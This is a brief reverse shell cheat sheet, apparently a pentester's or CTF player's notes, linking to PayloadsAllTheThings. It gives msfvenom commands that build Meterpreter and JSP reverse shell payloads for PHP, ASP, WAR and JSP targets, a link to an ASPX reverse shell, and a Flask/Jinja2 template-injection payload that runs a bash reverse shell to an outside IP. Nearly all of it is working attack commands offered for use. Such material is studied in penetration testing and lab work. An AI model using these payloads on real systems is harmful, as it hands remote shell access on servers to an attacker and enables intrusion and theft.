## Reverse Shell Cheat Sheet

[PayloadsAllTheThings Github Repo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

## PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
```

## ASP/ASPX

```
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
```

## WAR

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
```

## JSP

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
```

## Flask/python SSTI

```
// https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
{{ ''.__class__.__mro__[1].__subclasses__()[407]('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.74/4757 0>&1"',shell=True,stdout=-1).communicate() }}
```